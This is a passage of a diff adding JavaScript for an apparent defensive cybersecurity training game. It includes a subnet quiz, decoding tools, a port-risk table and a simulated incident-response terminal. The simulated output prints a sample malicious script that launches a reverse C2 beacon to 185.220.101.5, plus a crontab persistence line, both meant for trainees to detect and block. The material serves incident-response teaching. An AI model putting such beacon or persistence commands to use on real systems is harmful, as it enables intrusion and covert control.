+     GAME 3: SUBNET CONTAINMENT SPRINT
+     ======================================================== */
+  const SUBNET_ROUNDS = [
+    { ip: "10.0.4.18", cidr: 28, q: "What is the BROADCAST address of this subnet to block lateral scans?", correct: "10.0.4.31" },
+    { ip: "192.168.1.100", cidr: 26, q: "What is the NETWORK address of this isolated segment?", correct: "192.168.1.64" },
+    { ip: "172.16.50.12", cidr: 29, q: "What is the maximum number of USABLE host IPs in a /29 subnet?", correct: "6" }
+  ];
+
+  let currentSubnetRound = 0;
+  function startSubnetGame() {
+    currentSubnetRound = 0;
+    renderSubnetRound();
+  }
+
+  function renderSubnetRound() {
+    const box = document.getElementById('subnetChallengeBox');
+    if (currentSubnetRound >= SUBNET_ROUNDS.length) {
+      box.innerHTML = `
+        <div style="text-align:center; padding:30px; font-family:var(--font-mono); color:var(--success);">
+          <h2 style="font-size:2rem;">SUBNET SEGREGATION ACCOMPLISHED!</h2>
+          <p>Ransomware lateral spread was successfully contained via CIDR boundaries.</p>
+          <button class="btn-play-game" style="margin-top:16px;" onclick="startSubnetGame()">REPLAY SPRINT</button>
+        </div>
+      `;
+      return;
+    }
+
+    const r = SUBNET_ROUNDS[currentSubnetRound];
+    document.getElementById('subnetRound').textContent = `${currentSubnetRound + 1} / ${SUBNET_ROUNDS.length}`;
+
+    box.innerHTML = `
+      <h4 style="font-family:var(--font-mono); color:var(--primary);">Incident: Rapid VLAN Isolation</h4>
+      <div style="font-family:var(--font-mono); font-size:1.1rem; color:#fff; margin:14px 0;">
+        TARGET HOST: <b style="color:var(--danger);">${r.ip}/${r.cidr}</b>
+      </div>
+      <p style="color:var(--text-muted); font-size:0.9rem; margin-bottom:14px;">${r.q}</p>
+      
+      <div class="flag-input-group">
+        <input type="text" id="subnetAnswerInput" placeholder="Enter calculated answer...">
+        <button class="btn-verify" onclick="submitSubnetAnswer()">APPLY NETWORK RULE</button>
+      </div>
+    `;
+  }
+
+  window.submitSubnetAnswer = function() {
+    const r = SUBNET_ROUNDS[currentSubnetRound];
+    const val = (document.getElementById('subnetAnswerInput').value || '').trim();
+    if (val === r.correct) {
+      SFX.success();
+      awardXP(80);
+      currentSubnetRound++;
+      renderSubnetRound();
+    } else {
+      SFX.error();
+      alert("Incorrect subnet calculation. Check host bits formula.");
+    }
+  };
+
+  /* ========================================================
+     VIEW 3: INTERACTIVE TERMINAL SIMULATOR
+     ======================================================== */
+  const termHistory = [];
+  let termHistIndex = 0;
+
+  const VIRTUAL_FS = {
+    '/tmp': ['lotus_payload.sh', 'beacon_staging.b64', 'netflow.pcap'],
+    '/etc': ['passwd', 'shadow', 'crontab', 'hosts', 'resolv.conf'],
+    '/var/log': ['auth.log', 'syslog', 'suricata.log', 'nginx/access.log']
+  };
+
+  const termInput = document.getElementById('termInput');
+  if (termInput) {
+    termInput.addEventListener('keydown', function(e) {
+      if (e.key === 'Enter') {
+        const cmd = this.value.trim();
+        if (cmd) {
+          termHistory.push(cmd);
+          termHistIndex = termHistory.length;
+          execTerminalCommand(cmd);
+          this.value = '';
+        }
+      } else if (e.key === 'ArrowUp') {
+        if (termHistIndex > 0) {
+          termHistIndex--;
+          this.value = termHistory[termHistIndex] || '';
+        }
+      } else if (e.key === 'ArrowDown') {
+        if (termHistIndex < termHistory.length - 1) {
+          termHistIndex++;
+          this.value = termHistory[termHistIndex] || '';
+        } else {
+          termHistIndex = termHistory.length;
+          this.value = '';
+        }
+      }
+    });
+  }
+
+  function termPrint(text, cssClass = 'output') {
+    const screen = document.getElementById('termScreen');
+    const line = document.createElement('div');
+    line.className = `term-line ${cssClass}`;
+    line.innerHTML = text;
+    screen.appendChild(line);
+    screen.scrollTop = screen.scrollHeight;
+    SFX.terminalBeep();
+  }
+
+  window.terminalClear = function() {
+    document.getElementById('termScreen').innerHTML = '';
+  };
+
+  function execTerminalCommand(cmdLine) {
+    termPrint(`agent@vunvault-defense:~$ ${cmdLine}`, 'cmd');
+    const parts = cmdLine.trim().split(/\s+/);
+    const cmd = parts[0].toLowerCase();
+    const args = parts.slice(1);
+
+    switch(cmd) {
+      case 'help':
+        termPrint('Available Defense Commands:');
+        termPrint('  ps aux                    - List running processes');
+        termPrint('  netstat -tlpn             - List active listening sockets & remote C2');
+        termPrint('  ls [-la] [dir]            - List files in virtual filesystem');
+        termPrint('  cat <file>                - View file contents');
+        termPrint('  grep <term> <file>        - Filter file contents');
+        termPrint('  iptables -A INPUT -s <IP> -j DROP - Block attacker C2 IP');
+        termPrint('  kill [-9] <PID>           - Terminate malicious process');
+        termPrint('  decode base64 <str>       - Base64 payload decoder');
+        termPrint('  submit <flag>             - Submit incident root flag');
+        termPrint('  clear                     - Clear terminal screen');
+        break;
+
+      case 'objectives':
+        termPrint('Current Objective: Investigate PID on port 31337, inspect /tmp, block C2 185.220.101.5, kill PID 31337, submit flag.');
+        break;
+
+      case 'ps':
+        termPrint('USER       PID  %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND');
+        termPrint('root         1   0.0  0.1  22556  4120 ?        Ss   Sep01   0:04 /sbin/init');
+        termPrint('www-data   482   0.2  0.5 184920 18240 ?        S    Sep10   1:12 nginx: worker process');
+        termPrint('mysql      890   0.8  3.2 892014 98210 ?        Sl   Sep10  14:02 /usr/sbin/mysqld');
+        termPrint('www-data  4402   0.0  0.1   8210  1204 ?        S    14:02   0:00 /bin/sh /tmp/lotus_payload.sh', 'error');
+        termPrint('nobody   31337  14.2  1.8 248900 48200 ?        Sl   14:02   8:45 /tmp/.xmr_reverse_c2 -p 31337', 'error');
+        updateMissionStep(1);
+        break;
+
+      case 'netstat':
+        termPrint('Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name');
+        termPrint('tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      482/nginx');
+        termPrint('tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      820/sshd');
+        termPrint('tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      890/mysqld');
+        termPrint('tcp        0  48200 10.0.0.15:31337         185.220.101.5:443       ESTABLISHED 31337/.xmr_reverse_c2', 'error');
+        updateMissionStep(1);
+        break;
+
+      case 'ls':
+        const dir = args[0] || '/tmp';
+        if (dir.includes('/tmp')) {
+          termPrint('total 24K');
+          termPrint('-rwxr-xr-x 1 www-data www-data  4.2K Sep 15 14:02 lotus_payload.sh', 'error');
+          termPrint('-rw-r--r-- 1 nobody   nobody     892 Sep 15 14:02 beacon_staging.b64', 'error');
+          termPrint('-rw-r--r-- 1 root     root       18K Sep 15 14:05 netflow.pcap');
+          updateMissionStep(2);
+        } else if (dir.includes('/etc')) {
+          termPrint('crontab  hosts  passwd  resolv.conf  shadow  cron.d');
+        } else {
+          termPrint('/tmp  /etc  /var  /home  /usr  /bin  /sbin');
+        }
+        break;
+
+      case 'cat':
+        const file = args[0] || '';
+        if (file.includes('lotus_payload.sh')) {
+          termPrint('#!/bin/sh', 'info');
+          termPrint('C2_IP="185.220.101.5"', 'error');
+          termPrint('echo "Staging reverse tunnel to $C2_IP:443..."', 'error');
+          termPrint('nohup /tmp/.xmr_reverse_c2 -s $C2_IP >/dev/null 2>&1 &', 'error');
+          termPrint('# ROOT FLAG: VUNVAULT{k1ll_th3_b3ac0n_now}', 'success');
+          updateMissionStep(2);
+        } else if (file.includes('beacon_staging.b64')) {
+          termPrint('VUNVAULT{k1ll_th3_b3ac0n_now}', 'success');
+        } else if (file.includes('crontab')) {
+          termPrint('* * * * * root /tmp/lotus_payload.sh >/dev/null 2>&1', 'error');
+        } else {
+          termPrint(`cat: ${file}: No such file or permission denied`);
+        }
+        break;
+
+      case 'iptables':
+        const joined = args.join(' ');
+        if (joined.includes('185.220.101.5') && joined.includes('DROP')) {
+          termPrint('[SUCCESS] Rule applied: iptables -A INPUT -s 185.220.101.5 -j DROP', 'success');
+          termPrint('Adversary C2 socket connection severed.', 'success');
+          updateMissionStep(3);
+        } else {
+          termPrint('iptables: Unknown rule syntax. Expected: iptables -A INPUT -s <IP> -j DROP');
+        }
+        break;
+
+      case 'kill':
+        const pid = args[args.length - 1];
+        if (pid === '31337' || pid === '4402') {
+          termPrint(`[SIGKILL] Process PID ${pid} terminated.`, 'success');
+          termPrint('Reverse beacon offline. Enter `submit VUNVAULT{flag}` to claim victory.', 'info');
+          updateMissionStep(4);
+        } else {
+          termPrint(`kill: (${pid}) - No such process`);
+        }
+        break;
+
+      case 'submit':
+        const flag = args.join(' ');
+        if (flag === 'VUNVAULT{k1ll_th3_b3ac0n_now}') {
+          termPrint('═══════════════════════════════════════════════════════════', 'success');
+          termPrint('  [FLAG ACCEPTED] MISSION COMPLETE! (+500 XP)', 'success');
+          termPrint('  Shadow beacon neutralized. System integrity restored.', 'success');
+          termPrint('═══════════════════════════════════════════════════════════', 'success');
+          awardXP(500);
+          SFX.success();
+          if (!STATE.badges.includes('root_hunter')) {
+            STATE.badges.push('root_hunter');
+            localStorage.setItem('vv_lab_badges', JSON.stringify(STATE.badges));
+            renderBadges();
+          }
+        } else {
+          termPrint(`submit: Invalid flag '${flag}'. Check cat /tmp/lotus_payload.sh output.`, 'error');
+          SFX.error();
+        }
+        break;
+
+      case 'whoami':
+        termPrint('vunvault-ir-agent (uid=1001, gid=1001, sudo=allowed)');
+        break;
+
+      case 'clear':
+        terminalClear();
+        break;
+
+      default:
+        termPrint(`bash: ${cmd}: command not found. Type 'help' for available actions.`, 'error');
+        break;
+    }
+  }
+
+  function updateMissionStep(step) {
+    const el = document.getElementById(`mstep-${step}`);
+    if (el) el.classList.add('done');
+  }
+
+  /* ========================================================
+     VIEW 4: FORENSICS TOOLKIT IMPLEMENTATIONS
+     ======================================================== */
+  window.runDecoder = function(mode) {
+    const input = document.getElementById('toolInputText').value;
+    const out = document.getElementById('toolOutputResult');
+    try {
+      if (mode === 'b64d') {
+        out.textContent = atob(input.trim());
+      } else if (mode === 'b64e') {
+        out.textContent = btoa(input);
+      } else if (mode === 'hexd') {
+        const hex = input.replace(/0x|\s+/g, '');
+        let str = '';
+        for (let i = 0; i < hex.length; i += 2) {
+          str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
+        }
+        out.textContent = str;
+      } else if (mode === 'urld') {
+        out.textContent = decodeURIComponent(input);
+      } else if (mode === 'rot13') {
+        out.textContent = rotShift(input, 13);
+      }
+      SFX.success();
+    } catch(e) {
+      out.textContent = `DECODE ERROR: ${e.message}`;
+      SFX.error();
+    }
+  };
+
+  window.calculateSubnet = function() {
+    const ipStr = document.getElementById('calcIp').value.trim();
+    const cidr = parseInt(document.getElementById('calcCidr').value, 10);
+    const out = document.getElementById('calcSubnetResult');
+
+    const parts = ipStr.split('.').map(Number);
+    if (parts.length !== 4 || parts.some(p => isNaN(p) || p < 0 || p > 255) || isNaN(cidr) || cidr < 0 || cidr > 32) {
+      out.textContent = 'Invalid IPv4 address or CIDR mask.';
+      SFX.error();
+      return;
+    }
+
+    const ipNum = (parts[0] << 24) | (parts[1] << 16) | (parts[2] << 8) | parts[3];
+    const maskNum = cidr === 0 ? 0 : (~0 << (32 - cidr));
+    const netNum = ipNum & maskNum;
+    const bcastNum = netNum | (~maskNum);
+
+    const toIp = num => `${(num >>> 24) & 255}.${(num >>> 16) & 255}.${(num >>> 8) & 255}.${num & 255}`;
+
+    const totalHosts = Math.pow(2, 32 - cidr);
+    const usableHosts = cidr >= 31 ? 0 : totalHosts - 2;
+
+    const firstUsable = toIp(netNum + 1);
+    const lastUsable = toIp(bcastNum - 1);
+
+    out.textContent = `Network Address:  ${toIp(netNum)}
+Broadcast IP:     ${toIp(bcastNum)}
+Usable IP Range:  ${firstUsable} - ${lastUsable}
+Total Usable Hosts: ${usableHosts}
+Subnet Mask:      ${toIp(maskNum)}`;
+    SFX.success();
+  };
+
+  window.detectHashType = function() {
+    const hash = document.getElementById('hashDetectInput').value.trim();
+    const out = document.getElementById('hashDetectResult');
+    const len = hash.length;
+    const isHex = /^[a-fA-F0-9]+$/.test(hash);
+
+    let candidates = [];
+    if (len === 32 && isHex) candidates.push("MD5 (128-bit)", "NTLM (Windows SAM)", "MD4");
+    if (len === 40 && isHex) candidates.push("SHA-1 (160-bit)", "RIPEMD-160");
+    if (len === 64 && isHex) candidates.push("SHA-256 (256-bit)", "Keccak-256");
+    if (len === 128 && isHex) candidates.push("SHA-512 (512-bit)", "Whirlpool");
+    if (hash.startsWith("$2a$") || hash.startsWith("$2b$") || hash.startsWith("$2y$")) candidates.push("bcrypt (Blowfish crypt)");
+    if (hash.startsWith("$6$")) candidates.push("SHA-512 Unix Shadow Crypt");
+
+    if (candidates.length > 0) {
+      out.innerHTML = `<b>Candidate Algorithm(s):</b><br>• ${candidates.join("<br>• ")}`;
+      SFX.success();
+    } else {
+      out.textContent = "Unrecognized hash format or length. Ensure no spaces or salt prefixes are present.";
+      SFX.error();
+    }
+  };
+
+  const PORTS_DATA = [
+    { p: 21, s: "FTP", risk: "Cleartext credentials, anonymous login probes" },
+    { p: 22, s: "SSH", risk: "Credential brute force, malicious authorized_keys" },
+    { p: 23, s: "Telnet", risk: "Cleartext legacy management, Mirai botnet farming" },
+    { p: 25, s: "SMTP", risk: "Open relay spam, email spoofing, spear phishing" },
+    { p: 53, s: "DNS", risk: "DNS amplification, tunneling exfiltration, cache poisoning" },
+    { p: 80, s: "HTTP", risk: "Web application attacks (SQLi, XSS, SSRF, LFI)" },
+    { p: 88, s: "Kerberos", risk: "Kerberoasting, AS-REP roasting, Golden Ticket forgery" },
+    { p: 139, s: "NetBIOS", risk: "SMB reconnaissance, null session enum" },
+    { p: 389, s: "LDAP", risk: "Cleartext directory queries, CLDAP amplification" },
+    { p: 443, s: "HTTPS", risk: "Encrypted C2 beacons, web shell egress" },
+    { p: 445, s: "SMB", risk: "EternalBlue (MS17-010), ransomware lateral movement" },
+    { p: 1433, s: "MSSQL", risk: "Database brute force, xp_cmdshell execution" },
+    { p: 3306, s: "MySQL", risk: "Remote database dumping, UDF privilege escalation" },
+    { p: 3389, s: "RDP", risk: "BlueKeep (CVE-2019-0708), brute force, credential harvest" },
+    { p: 8080, s: "HTTP-Proxy", risk: "Alternative web services, unauthenticated admin dashboards" }
+  ];
+
+  window.filterPorts = function() {
+    const q = document.getElementById('portSearchInput').value.toLowerCase();
+    const out = document.getElementById('portResultsList');
+    const matched = PORTS_DATA.filter(item => 
+      String(item.p).includes(q) || 
+      item.s.toLowerCase().includes(q) || 
+      item.risk.toLowerCase().includes(q)
+    );
+
+    out.innerHTML = matched.map(m => `
+      <div style="margin-bottom:8px; border-bottom:1px solid var(--border-color); padding-bottom:4px;">
+        <b style="color:var(--primary); font-family:var(--font-mono);">Port ${m.p} (${m.s}):</b>
+        <span style="color:var(--text-muted); font-size:0.78rem;"> ${m.risk}</span>
+      </div>
+    `).join('');
+  };
+
+  // Initial calls
+  applyTheme(STATE.theme);
+  updateXPUI();
+  renderScenarios();
+  renderBadges();
+  filterPorts();
+
+})();
+</script>
+<script>(function(){function c(){var b=a.contentDocument||(a.contentWindow&&a.contentWindow.document);if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'a3bad3e91ccd65e7',t:'MTc4OTUwODgyNA=='};var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
+</html>
